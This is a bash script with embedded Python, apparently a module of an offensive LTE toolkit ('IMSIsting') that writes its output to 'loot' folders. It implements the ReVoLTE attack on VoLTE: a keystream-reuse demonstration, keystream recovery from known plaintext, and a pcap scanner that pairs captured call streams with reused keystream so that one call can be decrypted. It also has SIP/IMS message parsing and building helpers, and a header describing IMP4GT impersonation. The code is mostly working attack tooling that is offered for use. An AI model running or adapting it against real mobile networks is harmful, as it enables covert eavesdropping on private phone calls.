#!/usr/bin/env bash
# volte ims — ReVoLTE keystream reuse and IMP4GT identity-mapping impersonation,
# plus SIP / IMS registration parsing.
#
# Two of the four attacks owned here are real crypto and state-machine work and
# are performed for real:
#
#   O11 ReVoLTE — D. Rupprecht, K. Kohls, T. Holz, C. Popper, "Call Me Maybe:
#       Eavesdropping Encrypted LTE Calls With ReVoLTE", USENIX Security 2020.
#       Two VoLTE calls that reuse the same radio resources (same RLC/MAC
#       allocation, same bearer, same COUNT) apply the same keystream, so the
#       XOR of the two ciphertexts is the XOR of the two plaintexts. A
#       known-plaintext segment recovers the keystream and decrypts the other
#       call. --revolte-demo and --keystream-recover implement this.
#
#   O12 IMP4GT — D. Rupprecht, K. Kohls, T. Holz, C. Popper, "IMP4GT:
#       IMPersonation Attacks in 4G NeTworks", NDSS 2020. The LTE lower layers
#       keep uplink and downlink as separate identities mapped by RNTI at
#       layer 2, which is not the layer the mutual authentication is anchored
#       at, so an attacker with a layer-2 position impersonates the UE toward
#       the network and the network toward the UE. The sequence and its
#       preconditions are built here; the transmit half is a handoff.
#
# Resolve IMSISTING_ROOT from this script's own path (see MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/volte_ims"
VIMS_DIR="$LOOT_DIR/volte_ims"
VIMS_PLAN_DIR="$VIMS_DIR/plans"
mkdir -p "$MOD_TMP" "$VIMS_DIR" "$VIMS_PLAN_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

# ── sanitisation and TSV split ──────────────────────────────────────────
vims_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

VIMS_F=()
vims_split() {
    VIMS_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        VIMS_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}

vims_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
vims_is_hex() {
    local h; h=$(vims_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
vims_hex_of() { python3 -c 'import sys; sys.stdout.write(sys.stdin.buffer.read().hex())'; }

# ── crypto / protocol engine (python3) ──────────────────────────────────
vims_py() {
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 missing — cannot run the crypto or SIP engine\n' >&2; return 1; }
    python3 - "$@" <<'PY'
import sys, os, re, struct, hashlib, socket, base64
import shutil, subprocess, threading, time, wave

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_CRYPTO = True
except Exception:
    HAVE_CRYPTO = False

# Fixed demo key/IV. This is the NIST SP 800-38A F.5.1 CTR-AES128 key and
# initial counter block, which makes the demo keystream the published one.
DEMO_KEY = bytes.fromhex('2b7e151628aed2a6abf7158809cf4f3c')
DEMO_IV  = bytes.fromhex('f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff')


def xorb(a, b):
    n = min(len(a), len(b))
    return bytes(x ^ y for x, y in zip(a[:n], b[:n]))


def ctr(key, iv, data):
    c = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
    return c.update(data) + c.finalize()


def ctr_keystream(key, iv, n):
    return ctr(key, iv, b'\x00' * n)


def longest_run(b):
    best = 0; cur = 1
    for i in range(1, len(b)):
        if b[i] == b[i - 1]:
            cur += 1
            if cur > best:
                best = cur
        else:
            cur = 1
    return best if b else 0


def cmd_ctr(argv):
    key, iv, pt = bytes.fromhex(argv[0]), bytes.fromhex(argv[1]), bytes.fromhex(argv[2])
    print(ctr(key, iv, pt).hex())


def cmd_revolte(argv):
    if not HAVE_CRYPTO:
        raise SystemExit('cryptography module missing')
    p1 = bytes.fromhex(argv[0]); p2 = bytes.fromhex(argv[1])
    if len(p1) != len(p2):
        raise SystemExit('plaintexts must be the same length')
    n = len(p1)
    ks = ctr_keystream(DEMO_KEY, DEMO_IV, n)
    c1 = xorb(p1, ks); c2 = xorb(p2, ks)
    xc = xorb(c1, c2); xp = xorb(p1, p2)
    ks_from_c1 = xorb(c1, p1)
    ks_from_c2 = xorb(c2, p2)
    rec2 = xorb(c2, ks_from_c1)
    print('key_hex\t%s' % DEMO_KEY.hex())
    print('initial_counter\t%s' % DEMO_IV.hex())
    print('keystream\t%s' % ks.hex())
    print('plaintext1\t%s' % p1.hex())
    print('plaintext2\t%s' % p2.hex())
    print('ciphertext1\t%s' % c1.hex())
    print('ciphertext2\t%s' % c2.hex())
    print('xor_ciphertexts\t%s' % xc.hex())
    print('xor_plaintexts\t%s' % xp.hex())
    print('xor_identity\t%s' % ('match' if xc == xp else 'MISMATCH'))
    print('keystream_from_ciphertext1\t%s' % ks_from_c1.hex())
    print('keystream_from_ciphertext2\t%s' % ks_from_c2.hex())
    print('keystream_match\t%s' % ('yes' if ks_from_c1 == ks and ks_from_c2 == ks else 'no'))
    print('recovered_plaintext2\t%s' % rec2.hex())
    print('recovered_match\t%s' % ('yes' if rec2 == p2 else 'no'))
    ok = (xc == xp) and ks_from_c1 == ks and ks_from_c2 == ks and rec2 == p2
    print('status\t%s' % ('demonstrated' if ok else 'failed'))
    return 0 if ok else 1


def cmd_ksr(argv):
    ct = bytes.fromhex(argv[0]); kp = bytes.fromhex(argv[1])
    second = bytes.fromhex(argv[2]) if len(argv) > 2 and argv[2] else None
    n = min(len(ct), len(kp))
    if n == 0:
        raise SystemExit('empty input')
    ks = xorb(ct[:n], kp[:n])
    print('keystream\t%s' % ks.hex())
    print('keystream_bytes\t%d' % n)
    print('ciphertext_bytes\t%d' % len(ct))
    print('known_plaintext_bytes\t%d' % len(kp))
    print('recovered_plaintext\t%s' % xorb(ct[:n], ks).hex())
    if second is not None:
        r2 = xorb(second[:n], ks)
        print('recovered_second\t%s' % r2.hex())
        print('recovered_second_bytes\t%d' % len(r2))
    if n < len(ct):
        print('status\tpartial')
        print('remainder_bytes\t%d' % (len(ct) - n))
        print('note\t%s' % 'the keystream beyond the known-plaintext segment is not derivable from this stream alone; a second ciphertext under the same keystream recovers only the bytes the known segment covers')
    else:
        print('status\tcomplete')
        print('remainder_bytes\t0')
    return 0


def read_pcap(path):
    d = open(path, 'rb').read()
    if len(d) < 24:
        raise SystemExit('file shorter than a pcap global header')
    if d[:4] == b'\xd4\xc3\xb2\xa1':
        endian = '<'
    elif d[:4] == b'\xa1\xb2\xc3\xd4':
        endian = '>'
    else:
        raise SystemExit('not a classic pcap (pcapng is unsupported; use editcap -F pcap)')
    link = struct.unpack(endian + 'IHHiIII', d[:24])[6]
    off = 24; out = []
    while off + 16 <= len(d):
        s, us, incl, orig = struct.unpack(endian + 'IIII', d[off:off + 16]); off += 16
        if off + incl > len(d):
            break
        out.append((s + us / 1000000.0, d[off:off + incl], link))
        off += incl
    return out


def udp_frames(path, port=0):
    """Every UDP datagram, with the five-tuple that says which stream it is.

    The older reader kept a timestamp and a payload, which threw away the two
    fields that decide whether two ciphertexts may be compared at all: which
    direction they travelled, and which SSRC they belong to.
    """
    res = []
    for ts, pkt, link in read_pcap(path):
        if link != 1 or len(pkt) < 14:
            continue
        if struct.unpack('!H', pkt[12:14])[0] != 0x0800:
            continue
        ip = pkt[14:]
        if len(ip) < 20 or (ip[0] >> 4) != 4 or ip[9] != 17:
            continue
        ihl = (ip[0] & 0x0f) * 4
        if len(ip) < ihl + 8:
            continue
        udp = ip[ihl:]
        sport, dport = struct.unpack('!HH', udp[:4])
        if port and port not in (sport, dport):
            continue
        payload = udp[8:]
        if len(payload) >= 16:
            res.append({"ts": ts, "src": socket.inet_ntoa(ip[12:16]),
                        "dst": socket.inet_ntoa(ip[16:20]),
                        "sport": sport, "dport": dport, "payload": payload})
    return res


def parse_rtp(p):
    """RTP fields, or None when these octets are not an RTP packet.

    `body` is everything after the header. In SRTP that is ciphertext plus the
    authentication tag, and the tag comes off only when the operator states how
    long it is -- assuming ten octets would shorten every frame of a cipher
    that uses sixteen.
    """
    if len(p) < 12 or (p[0] >> 6) != 2:
        return None
    n = 12 + 4 * (p[0] & 0x0f)
    if p[0] & 0x10:
        if len(p) < n + 4:
            return None
        n += 4 + 4 * struct.unpack('!H', p[n + 2:n + 4])[0]
    if len(p) <= n:
        return None
    return {"ssrc": struct.unpack('!I', p[8:12])[0],
            "seq": struct.unpack('!H', p[2:4])[0],
            "pt": p[1] & 0x7f, "body": p[n:]}


def seq_consistent(seqs):
    """Fraction of consecutive sequence numbers that advance by exactly one.

    A single lucky first octet can make ciphertext look like an RTP header.
    What it cannot do is produce a dozen sequence numbers that count.
    """
    if len(seqs) < 2:
        return 0.0
    good = sum(1 for a, b in zip(seqs, seqs[1:]) if (b - a) % 65536 == 1)
    return good / float(len(seqs) - 1)


def _stream_of(dkey, ssrc, items, tag):
    frames = []
    for fr, rtp in items:
        body = fr["payload"] if rtp is None else rtp["body"]
        if tag:
            body = body[:-tag] if len(body) > tag else b''
        if len(body) < 16:
            continue
        frames.append((fr["ts"], rtp["seq"] if rtp is not None else 0, body))
    frames.sort(key=lambda t: (t[0], t[1]))
    return {"src": dkey[0], "sport": dkey[1], "dst": dkey[2], "dport": dkey[3],
            "ssrc": ssrc, "frames": frames}


def group_streams(frames, tag=0):
    """One entry per stream: one direction of one SSRC, frames in send order.

    Shape is decided per direction, not per packet. Ciphertext has no header to
    read, so a payload whose first octet happens to look like RTP would split a
    bare stream into pieces with invented SSRCs. Acceptance needs corroboration:
    two or more frames and sequence numbers that count. What fails that test is
    reported as `ambiguous_rtp` and kept as one bare stream.
    """
    dirs = {}
    order = []
    for f in frames:
        dkey = (f["src"], f["sport"], f["dst"], f["dport"])
        d = dirs.get(dkey)
        if d is None:
            d = []
            dirs[dkey] = d
            order.append(dkey)
        d.append(f)
    streams = []
    ambiguous = 0
    for dkey in order:
        cand = {}
        bare = []
        for f in dirs[dkey]:
            rtp = parse_rtp(f["payload"])
            if rtp is None:
                bare.append((f, None))
            else:
                cand.setdefault(rtp["ssrc"], []).append((f, rtp))
        for ssrc, items in cand.items():
            seqs = [it[1]["seq"] for it in items]
            if len(items) >= 2 and seq_consistent(seqs) >= 0.8:
                streams.append(_stream_of(dkey, ssrc, items, tag))
            else:
                ambiguous += len(items)
                bare.extend(items)
        if bare:
            streams.append(_stream_of(dkey, None, bare, tag))
    streams = [x for x in streams if x["frames"]]
    streams.sort(key=lambda x: x["frames"][0][0])
    return streams, ambiguous


def compare_streams(a, b):
    """Compare frame k of one stream with frame k of the other.

    Position is the whole comparison. A keystream advances per frame, so two
    packets sitting at different offsets in their calls carry different
    keystream whether or not the same generator fed them. Aligning by index is
    what makes the difference mean reuse instead of coincidence.
    """
    n = min(len(a["frames"]), len(b["frames"]))
    fired = 0
    run_best = 0
    zf_best = 0.0
    length = 0
    for k in range(n):
        x = xorb(a["frames"][k][2], b["frames"][k][2])
        if len(x) < 16:
            continue
        run = longest_run(x)
        zf = x.count(0) / float(len(x))
        if run >= 8 or zf > 0.05:
            fired += 1
            if run > run_best:
                run_best, length = run, len(x)
            if zf > zf_best:
                zf_best = zf
    return {"aligned": n, "fired": fired, "run": run_best, "zf": zf_best,
            "length": length}


def is_reverse(a, b):
    return ((a["src"], a["sport"], a["dst"], a["dport"]) ==
            (b["dst"], b["dport"], b["src"], b["sport"]))


def read_calls_tsv(path):
    """Rows from `23_traffic_analysis --calls-tsv`."""
    rows = []
    head = None
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        for line in f:
            parts = line.rstrip('\n').split('\t')
            if head is None:
                head = parts
                continue
            if len(parts) != len(head):
                continue
            rows.append(dict(zip(head, parts)))
    return rows


def call_of(stream, calls):
    """The call row this stream belongs to: by SSRC first, endpoint second."""
    if stream["ssrc"] is not None:
        want = "%08x" % stream["ssrc"]
        for r in calls:
            if want in [x for x in r.get("ssrcs", "").split(",") if x]:
                return r
    ep = "%s:%d" % (stream["dst"], stream["dport"])
    for r in calls:
        if ep in [x for x in r.get("media_endpoints", "").split(",") if x]:
            return r
    return None


MIN_ALIGNED = 3


def cmd_reuse(argv):
    path = argv[0]
    port = int(argv[1]) if len(argv) > 1 and argv[1] else 0
    calls_path = argv[2] if len(argv) > 2 else ''
    tag = int(argv[3]) if len(argv) > 3 and argv[3] else 0
    streams, ambiguous = group_streams(udp_frames(path, port), tag)
    print('ciphertext_streams\t%d' % len(streams))
    print('ambiguous_rtp\t%d' % ambiguous)
    for i, s in enumerate(streams):
        who = ('ssrc 0x%08x' % s["ssrc"] if s["ssrc"] is not None
               else 'no-rtp-header')
        print('stream.%d\t%s:%d -> %s:%d %s frames %d'
              % (i, s["src"], s["sport"], s["dst"], s["dport"], who,
                 len(s["frames"])))
    if len(streams) < 2:
        print('status\tnot_determinable')
        print('reason\tfewer than two ciphertext streams; reuse needs two')
        return 1
    calls = read_calls_tsv(calls_path) if calls_path else []
    if calls_path:
        print('calls_source\t%s' % calls_path)
        print('calls_rows\t%d' % len(calls))
    pairs = 0
    hits = 0
    rev = 0
    same = 0
    for i in range(len(streams)):
        for j in range(i + 1, len(streams)):
            a = streams[i]
            b = streams[j]
            if is_reverse(a, b):
                rev += 1
                print('excluded.%d.reverse\t%d:%d' % (rev - 1, i, j))
                continue
            ca = call_of(a, calls) if calls else None
            cb = call_of(b, calls) if calls else None
            if ca is not None and ca is cb:
                same += 1
                print('excluded.%d.same_call\t%d:%d call %s'
                      % (same - 1, i, j, ca.get("call", "?")))
                continue
            pairs += 1
            c = compare_streams(a, b)
            if c["aligned"] < MIN_ALIGNED or c["fired"] < MIN_ALIGNED:
                continue
            print('finding.%d.streams\t%d:%d' % (hits, i, j))
            print('finding.%d.aligned_frames\t%d' % (hits, c["aligned"]))
            print('finding.%d.fired_frames\t%d' % (hits, c["fired"]))
            print('finding.%d.longest_run\t%d' % (hits, c["run"]))
            print('finding.%d.zero_fraction\t%.3f' % (hits, c["zf"]))
            if ca is not None or cb is not None:
                print('finding.%d.call_a\t%s'
                      % (hits, ca.get("call", "?") if ca else "unmatched"))
                print('finding.%d.call_b\t%s'
                      % (hits, cb.get("call", "?") if cb else "unmatched"))
                print('finding.%d.call_id_a\t%s'
                      % (hits, ca.get("sip_call_id", "") if ca else ""))
                print('finding.%d.call_id_b\t%s'
                      % (hits, cb.get("sip_call_id", "") if cb else ""))
            hits += 1
    print('pairs_compared\t%d' % pairs)
    print('excluded_reverse\t%d' % rev)
    print('excluded_same_call\t%d' % same)
    print('reuse_findings\t%d' % hits)
    print('status\t%s' % ('keystream_reuse' if hits else 'no_reuse'))
    print('note\t%s' % 'reuse means both calls drew the same keystream, so '
          'aligned frame ciphertexts XOR to codec plaintext XOR, which carries '
          'long byte runs and a high zero fraction; a stream is never compared '
          'with its own reverse direction (that is a second key, not a second '
          'call) and, when a calls table is supplied, never with another stream '
          'of its own call')
    return 0


def w_pcap(path, frames):
    with open(path, 'wb') as f:
        f.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        for ts, pkt in frames:
            s = int(ts); us = int(round((ts - s) * 1000000))
            f.write(struct.pack('<IIII', s, us, len(pkt), len(pkt)))
            f.write(pkt)


def eth_udp(payload, sport, dport, ts, sip='10.0.0.1', dip='10.0.0.2'):
    udp = struct.pack('!HHHH', sport, dport, 8 + len(payload), 0) + payload
    iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(udp), 0, 0, 64, 17, 0,
                      socket.inet_aton(sip), socket.inet_aton(dip))
    eth = b'\xff' * 6 + b'\x02' * 6 + struct.pack('!H', 0x0800) + iph + udp
    return (ts, eth)


def rtp_frame(ssrc, seq, tstamp, pt, body):
    return struct.pack('!BBHII', 0x80, pt & 0x7f, seq & 0xffff,
                       tstamp & 0xffffffff, ssrc & 0xffffffff) + body


# AMR-ish speech: mostly silence with a short voiced run. Two frames that
# differ, so their XOR is structured rather than empty.
SPEECH_A = bytes([0x00] * 80 + [0x04, 0x0c] * 8 + [0x00] * 64)
SPEECH_B = bytes([0x00] * 96 + [0x04, 0x0c] * 4 + [0x00] * 64)
FRAME_LEN = len(SPEECH_A)


def frame_plain(k, which):
    base = SPEECH_A if which == 0 else SPEECH_B
    shift = 2 * (k % 3)
    return base[:shift] + bytes([0x00] * 64) + base[shift:]


def keystream_slices(n, iv=DEMO_IV):
    """One counter-mode keystream, cut per frame, as a call would consume it."""
    long_ks = ctr_keystream(DEMO_KEY, iv, FRAME_LEN * (n + 2))
    return [long_ks[k * FRAME_LEN:(k + 1) * FRAME_LEN] for k in range(n + 2)]


def one_stream(ssrc, sport, dport, plaintexts, keystreams, t0,
               src='10.0.0.1', dst='10.0.0.2', rtp=True, seq0=1000):
    out = []
    for k, (pt, ks) in enumerate(zip(plaintexts, keystreams)):
        ct = xorb(pt, ks)
        body = (rtp_frame(ssrc, seq0 + k, 160000 + 160 * k, 96, ct)
                if rtp else ct)
        out.append(eth_udp(body, sport, dport, t0 + 0.02 * k, src, dst))
    return out


def cmd_mkfixture(argv):
    path, kind = argv[0], argv[1]
    n = 12
    pa = [frame_plain(k, 0) for k in range(n)]
    pb = [frame_plain(k, 1) for k in range(n)]
    ks = keystream_slices(n + 1)
    other = keystream_slices(n + 1, bytes.fromhex('f0f1f2f3f4f5f6f7f8f9fafbfcfdfe00'))
    if kind == 'reuse':
        frames = (one_stream(0x11111111, 5004, 5005, pa, ks, 0.0) +
                  one_stream(0x22222222, 5006, 5007, pb, ks, 0.01))
    elif kind == 'noreuse':
        frames = (one_stream(0x11111111, 5004, 5005, pa, ks, 0.0) +
                  one_stream(0x22222222, 5006, 5007, pb, other, 0.01))
    elif kind == 'shifted':
        # the same keystream, one frame out of step: reuse of the generator but
        # not of the position, so an index-aligned comparison must stay clean
        frames = (one_stream(0x11111111, 5004, 5005, pa, ks, 0.0) +
                  one_stream(0x22222222, 5006, 5007, pb, ks[1:], 0.01))
    elif kind == 'reverse':
        # one call, both directions, deliberately fed the same keystream: two
        # legs of one call are two keys, and comparing them would be a finding
        # manufactured out of the fixture
        frames = (one_stream(0x11111111, 5004, 5005, pa, ks, 0.0) +
                  one_stream(0x22222222, 5005, 5004, pb, ks, 0.01,
                             src='10.0.0.2', dst='10.0.0.1'))
    elif kind == 'bare':
        frames = (one_stream(0, 5004, 5005, pa, ks, 0.0, rtp=False) +
                  one_stream(0, 5006, 5007, pb, ks, 0.01, rtp=False))
    elif kind == 'mixed':
        # two SSRCs on one five-tuple: a multiplexed pair, not two packets of
        # one stream, and the grouping has to say so
        frames = (one_stream(0x11111111, 5004, 5005, pa, ks, 0.0) +
                  one_stream(0x22222222, 5004, 5005, pb, ks, 0.01))
    else:
        raise SystemExit('unknown fixture kind')
    frames.sort(key=lambda t: t[0])
    w_pcap(path, frames)


# ── SIP ─────────────────────────────────────────────────────────────────
def parse_sip(raw):
    text = raw.decode('utf-8', 'replace')
    # tolerate both CRLF and LF, and a leading blank line
    lines = text.replace('\r\n', '\n').replace('\r', '\n').split('\n')
    while lines and lines[0] == '':
        lines.pop(0)
    out = []
    if not lines:
        return out
    first = lines[0]
    method = request_uri = status = reason = ''
    if first.startswith('SIP/2.0'):
        p = first.split(' ', 2)
        mtype = 'response'
        status = p[1] if len(p) > 1 else ''
        reason = p[2] if len(p) > 2 else ''
    else:
        p = first.split(' ')
        mtype = 'request'
        method = p[0] if p else ''
        request_uri = p[1] if len(p) > 1 else ''
    headers = {}
    i = 1
    while i < len(lines) and lines[i] != '':
        ln = lines[i]
        if ':' in ln:
            k, v = ln.split(':', 1)
            headers.setdefault(k.strip().lower(), []).append(v.strip())
        i += 1
    body = '\n'.join(lines[i + 1:]) if i < len(lines) else ''
    out.append(('type', mtype))
    out.append(('method', method if method else '-'))
    out.append(('request_uri', request_uri if request_uri else '-'))
    out.append(('status_code', status if status else '-'))
    out.append(('reason', reason if reason else '-'))
    for k in ('via', 'from', 'to', 'contact', 'call-id', 'cseq', 'content-type',
              'authorization', 'www-authenticate', 'expires', 'security-client'):
        vals = headers.get(k, [])
        if k == 'via':
            out.append(('via', vals[0] if vals else '-'))
            out.append(('via_count', str(len(vals))))
        else:
            out.append((k.replace('-', '_'), vals[0] if vals else '-'))
    # SDP body
    sdp_media = []; sdp_rtpmap = []; sdp_conn = ''; sdp_ver = ''
    for ln in body.split('\n'):
        if ln.startswith('v='):
            sdp_ver = ln[2:]
        elif ln.startswith('c='):
            sdp_conn = ln[2:]
        elif ln.startswith('m='):
            sdp_media.append(ln[2:])
        elif ln.startswith('a=rtpmap:'):
            sdp_rtpmap.append(ln[len('a=rtpmap:'):])
    out.append(('sdp_version', sdp_ver if sdp_ver else '-'))
    out.append(('sdp_connection', sdp_conn if sdp_conn else '-'))
    out.append(('sdp_media', ';'.join(sdp_media) if sdp_media else '-'))
    out.append(('sdp_rtpmap', ','.join(sdp_rtpmap) if sdp_rtpmap else '-'))
    return out


def san(v):
    # every value that reaches a TSV row is untrusted: a SIP header can carry
    # a tab, and a tab would forge a field (MODULE_CONVENTIONS section 12).
    return str(v).replace('\t', ' ').replace('\r', ' ').replace('\n', ' ')


def cmd_sip(argv):
    raw = bytes.fromhex(argv[0])
    for k, v in parse_sip(raw):
        print('%s\t%s' % (k, san(v)))


def cmd_msgs(argv):
    kind = argv[0]
    if kind in ('register', 'register_auth', 'challenge', 'ok', 'invite'):
        pass
    else:
        raise SystemExit('unknown message kind')
    body = ''
    if kind == 'invite':
        body = ('v=0\r\n'
                'o=- 1 1 IN IP6 2001:db8::1\r\n'
                's=-\r\n'
                'c=IN IP6 2001:db8::1\r\n'
                't=0 0\r\n'
                'm=audio 49152 RTP/AVP 97 98\r\n'
                'a=rtpmap:97 AMR/8000\r\n'
                'a=rtpmap:98 AMR-WB/16000\r\n'
                'a=sendrecv\r\n')
    if kind == 'register':
        lines = [
            'REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK1;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 1 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"',
            'Expires: 600000',
            'Security-Client: ipsec-3gpp;alg=hmac-sha-1-96;ealg=null;spi-c=1;spi-s=2;port-c=5062;port-s=5063',
            'Content-Length: 0',
        ]
    elif kind == 'challenge':
        lines = [
            'SIP/2.0 401 Unauthorized',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK1;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=srv1',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 1 REGISTER',
            'WWW-Authenticate: Digest realm="ims.mnc001.mcc310.3gppnetwork.org", nonce="Q2hhbGxlbmdl", algorithm=AKAv1-MD5, qop="auth"',
            'Content-Length: 0',
        ]
    elif kind == 'register_auth':
        lines = [
            'REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK2;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 2 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>',
            'Authorization: Digest username="310150123456789@ims.mnc001.mcc310.3gppnetwork.org", realm="ims.mnc001.mcc310.3gppnetwork.org", nonce="Q2hhbGxlbmdl", uri="sip:ims.mnc001.mcc310.3gppnetwork.org", response="00000000000000000000000000000000", algorithm=AKAv1-MD5, qop=auth, nc=00000001, cnonce="0a4f113b"',
            'Content-Length: 0',
        ]
    else:
        lines = [
            'SIP/2.0 200 OK',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK2;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=srv1',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 2 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>;expires=600000',
            'Content-Length: 0',
        ]
    body = body if kind == 'invite' else ''
    if kind != 'invite':
        # replace Content-Length if a body exists (none of the canned ones do)
        pass
    else:
        lines = [
            'INVITE sip:310150987654321@ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK3;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=aa11',
            'To: <sip:310150987654321@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 9988776655@2001:db8::1',
            'CSeq: 1 INVITE',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>',
            'Content-Type: application/sdp',
            'Content-Length: %d' % len(body),
        ]
    msg = '\r\n'.join(lines) + '\r\n\r\n' + body
    sys.stdout.write(msg.encode().hex())


def cmd_digest(argv):
    user, realm, pw, method, uri = argv[0], argv[1], argv[2], argv[3], argv[4]
    nonce = argv[5] if len(argv) > 5 and argv[5] else ''
    nc = argv[6] if len(argv) > 6 and argv[6] else ''
    cnonce = argv[7] if len(argv) > 7 and argv[7] else ''
    qop = argv[8] if len(argv) > 8 and argv[8] else ''
    ha1 = hashlib.md5(('%s:%s:%s' % (user, realm, pw)).encode()).hexdigest()
    ha2 = hashlib.md5(('%s:%s' % (method, uri)).encode()).hexdigest()
    if qop:
        resp = hashlib.md5(('%s:%s:%s:%s:%s:%s' % (ha1, nonce, nc, cnonce, qop, ha2)).encode()).hexdigest()
    else:
        resp = hashlib.md5(('%s:%s:%s' % (ha1, nonce, ha2)).encode()).hexdigest()
    print('ha1\t%s' % ha1)
    print('ha2\t%s' % ha2)
    print('response\t%s' % resp)



# ── SIP message construction ───────────────────────────────────────────
# The parser above tolerates sloppy input on purpose (a capture is not ours to
# control). A message WE build must be exactly what RFC 3261 asks for, so this
# side is strict: CRLF line endings, every mandatory header, and a
# Content-Length that is the byte count of the body and nothing else.
class SipError(Exception):
    pass


def _bad_field(name, value):
    # A CR or LF inside a header value closes our header and opens theirs. That
    # is header injection, and a builder that allows it can be made to emit any
    # message at all -- exactly what tools/check-sip-codec.sh exists to catch.
    if '\r' in value or '\n' in value or '\0' in value:
        raise SipError('%s must not contain CR, LF or NUL' % name)
    return value


def _addr(user, tag=None):
    s = '<sip:%s>' % _bad_field('address', user)
    if tag:
        s += ';tag=%s' % _bad_field('tag', tag)
    return s


def _rand(n):
    return ''.join('%02x' % b for b in os.urandom(n))


def _sip_defaults(kind, opt):
    d = {
        'impi': '310150123456789@ims.mnc001.mcc310.3gppnetwork.org',
        'contact': '310150123456789@10.0.0.9:5060',
        'host': '10.0.0.9',
        'port': '5060',
        'domain': 'ims.mnc001.mcc310.3gppnetwork.org',
        'cseq': '1',
        'expires': '600000',
        'from_tag': _rand(4),
        'to_tag': '',
        'branch': 'z9hG4bK' + _rand(6),
        'callid': _rand(8) + '@' + '10.0.0.9',
        'realm': 'ims.mnc001.mcc310.3gppnetwork.org',
        'nonce': _rand(8),
        'algorithm': 'AKAv1-MD5',
        'qop': 'auth',
        'nc': '00000001',
        'cnonce': _rand(4),
        'uri': 'sip:ims.mnc001.mcc310.3gppnetwork.org',
        'response': '0' * 32,
        'ruri': '',
        'target': '310150123456780@ims.mnc001.mcc310.3gppnetwork.org',
        'user_agent': 'IMSIsting',
    }
    d.update(opt)
    if not d['ruri']:
        d['ruri'] = d['domain']
    return d


